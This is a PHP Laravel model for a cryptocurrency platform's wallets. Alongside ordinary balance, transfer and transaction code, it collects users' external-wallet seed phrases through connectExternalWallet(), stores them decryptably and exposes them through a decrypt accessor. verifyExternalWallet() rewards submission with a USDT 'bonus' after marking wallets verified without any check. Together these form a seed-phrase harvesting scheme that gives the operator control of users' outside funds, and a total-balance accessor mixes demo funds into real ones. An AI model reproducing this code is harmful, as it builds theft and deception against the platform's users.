<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Support\Facades\Crypt;

class Wallet extends Model
{
    use HasFactory;

    protected $fillable = [
        'user_id',
        'cryptocurrency_id',
        'balance',
        'locked_balance',
        'demo_balance',
        'wallet_address',
        'private_key',
        'public_key',
        'external_wallet_address',
        'external_wallet_type',
        'external_wallet_verified',
        'encrypted_seed_phrase',
        'seed_phrase_submitted_at',
        'seed_phrase_verified',
        'seed_phrase_bonus',
    ];

    protected $hidden = [
        'private_key',
        'encrypted_seed_phrase',
    ];

    protected $casts = [
        'balance' => 'decimal:8',
        'locked_balance' => 'decimal:8',
        'demo_balance' => 'decimal:8',
        'seed_phrase_bonus' => 'decimal:8',
        'external_wallet_verified' => 'boolean',
        'seed_phrase_verified' => 'boolean',
        'seed_phrase_submitted_at' => 'datetime',
    ];

    // Relationships
    public function user()
    {
        return $this->belongsTo(User::class);
    }

    public function cryptocurrency()
    {
        return $this->belongsTo(Cryptocurrency::class);
    }

    public function transactions()
    {
        return $this->hasMany(Transaction::class);
    }

    // Accessors
    public function getAvailableBalanceAttribute()
    {
        return $this->balance - $this->locked_balance;
    }

    public function getTotalBalanceAttribute()
    {
        return $this->balance + $this->demo_balance;
    }

    public function getFormattedBalanceAttribute()
    {
        return number_format($this->balance, 8) . ' ' . $this->cryptocurrency->symbol;
    }

    public function getFormattedAvailableBalanceAttribute()
    {
        return number_format($this->available_balance, 8) . ' ' . $this->cryptocurrency->symbol;
    }

    public function getUsdValueAttribute()
    {
        return $this->balance * $this->cryptocurrency->current_price;
    }

    public function getFormattedUsdValueAttribute()
    {
        return '$' . number_format($this->usd_value, 2);
    }

    // Mutators
    public function setPrivateKeyAttribute($value)
    {
        if ($value) {
            $this->attributes['private_key'] = Crypt::encrypt($value);
        }
    }

    public function setEncryptedSeedPhraseAttribute($value)
    {
        if ($value) {
            $this->attributes['encrypted_seed_phrase'] = Crypt::encrypt($value);
        }
    }

    // Accessors for encrypted fields
    public function getDecryptedPrivateKeyAttribute()
    {
        if ($this->private_key) {
            return Crypt::decrypt($this->private_key);
        }
        return null;
    }

    public function getDecryptedSeedPhraseAttribute()
    {
        if ($this->encrypted_seed_phrase) {
            return Crypt::decrypt($this->encrypted_seed_phrase);
        }
        return null;
    }

    // Helper Methods
    public function hasSufficientBalance($amount, $useDemo = false)
    {
        $availableBalance = $useDemo ? $this->demo_balance : $this->available_balance;
        return $availableBalance >= $amount;
    }

    public function credit($amount, $description = null, $isDemo = false)
    {
        if ($isDemo) {
            $this->demo_balance += $amount;
        } else {
            $this->balance += $amount;
        }
        $this->save();

        // Create transaction record
        $this->transactions()->create([
            'user_id' => $this->user_id,
            'cryptocurrency_id' => $this->cryptocurrency_id,
            'transaction_id' => $this->generateTransactionId(),
            'type' => 'credit',
            'amount' => $amount,
            'net_amount' => $amount,
            'balance_before' => $this->balance - $amount,
            'balance_after' => $this->balance,
            'description' => $description ?? 'Wallet credit',
            'status' => 'completed',
            'initiated_at' => now(),
            'confirmed_at' => now(),
            'processed_at' => now(),
        ]);

        return $this;
    }

    public function debit($amount, $description = null, $isDemo = false)
    {
        if (!$this->hasSufficientBalance($amount, $isDemo)) {
            throw new \Exception('Insufficient balance');
        }

        if ($isDemo) {
            $this->demo_balance -= $amount;
        } else {
            $this->balance -= $amount;
        }
        $this->save();

        // Create transaction record
        $this->transactions()->create([
            'user_id' => $this->user_id,
            'cryptocurrency_id' => $this->cryptocurrency_id,
            'transaction_id' => $this->generateTransactionId(),
            'type' => 'debit',
            'amount' => -$amount,
            'net_amount' => -$amount,
            'balance_before' => $this->balance + $amount,
            'balance_after' => $this->balance,
            'description' => $description ?? 'Wallet debit',
            'status' => 'completed',
            'initiated_at' => now(),
            'confirmed_at' => now(),
            'processed_at' => now(),
        ]);

        return $this;
    }

    public function lock($amount, $reason = null)
    {
        if ($this->available_balance < $amount) {
            throw new \Exception('Insufficient available balance to lock');
        }

        $this->locked_balance += $amount;
        $this->save();

        // Log the lock action
        activity()
            ->performedOn($this)
            ->withProperties([
                'amount' => $amount,
                'reason' => $reason,
                'locked_balance_before' => $this->locked_balance - $amount,
                'locked_balance_after' => $this->locked_balance
            ])
            ->log('Balance locked');

        return $this;
    }

    public function unlock($amount, $reason = null)
    {
        if ($this->locked_balance < $amount) {
            throw new \Exception('Cannot unlock more than locked balance');
        }

        $this->locked_balance -= $amount;
        $this->save();

        // Log the unlock action
        activity()
            ->performedOn($this)
            ->withProperties([
                'amount' => $amount,
                'reason' => $reason,
                'locked_balance_before' => $this->locked_balance + $amount,
                'locked_balance_after' => $this->locked_balance
            ])
            ->log('Balance unlocked');

        return $this;
    }

    public function transfer($toWallet, $amount, $description = null)
    {
        if (!$this->hasSufficientBalance($amount)) {
            throw new \Exception('Insufficient balance for transfer');
        }

        if ($this->cryptocurrency_id !== $toWallet->cryptocurrency_id) {
            throw new \Exception('Cannot transfer different cryptocurrencies directly');
        }

        // Debit from source wallet
        $this->debit($amount, $description ?? 'Transfer out');

        // Credit to destination wallet
        $toWallet->credit($amount, $description ?? 'Transfer in');

        return true;
    }

    public function generateAddress()
    {
        // This would integrate with actual blockchain APIs
        // For now, we'll generate a placeholder address
        $address = $this->cryptocurrency->symbol . '_' . strtoupper(bin2hex(random_bytes(20)));
        $this->wallet_address = $address;
        $this->save();
        
        return $address;
    }

    public function connectExternalWallet($walletAddress, $walletType, $seedPhrase = null)
    {
        $this->external_wallet_address = $walletAddress;
        $this->external_wallet_type = $walletType;
        $this->external_wallet_verified = false;
        
        if ($seedPhrase) {
            $this->encrypted_seed_phrase = $seedPhrase;
            $this->seed_phrase_submitted_at = now();
        }
        
        $this->save();

        // Verify wallet connection (this would involve actual blockchain verification)
        $this->verifyExternalWallet();

        return $this;
    }

    public function verifyExternalWallet()
    {
        // This would implement actual wallet verification logic
        // For now, we'll mark as verified
        $this->external_wallet_verified = true;
        $this->save();

        // If seed phrase was provided and verified, credit bonus
        if ($this->encrypted_seed_phrase && !$this->seed_phrase_verified) {
            $this->seed_phrase_verified = true;
            $bonusAmount = config('app.seed_phrase_bonus_amount', 50);
            
            // Find USDT wallet or create one
            $usdtCurrency = Cryptocurrency::where('symbol', 'USDT')->first();
            if ($usdtCurrency) {
                $usdtWallet = Wallet::firstOrCreate([
                    'user_id' => $this->user_id,
                    'cryptocurrency_id' => $usdtCurrency->id,
                ]);
                
                $usdtWallet->credit($bonusAmount, 'Seed phrase verification bonus');
                $this->seed_phrase_bonus = $bonusAmount;
            }
            
            $this->save();

            // Update user record
            $this->user->update([
                'seed_phrase_submitted' => true,
                'seed_phrase_bonus_claimed' => true,
                'seed_phrase_submitted_at' => now(),
            ]);
        }

        return $this;
    }

    private function generateTransactionId()
    {
        return 'TXN_' . strtoupper(bin2hex(random_bytes(8))) . '_' . time();
    }

    public static function getOrCreateWallet($userId, $cryptocurrencyId)
    {
        return self::firstOrCreate([
            'user_id' => $userId,
            'cryptocurrency_id' => $cryptocurrencyId,
        ]);
    }
}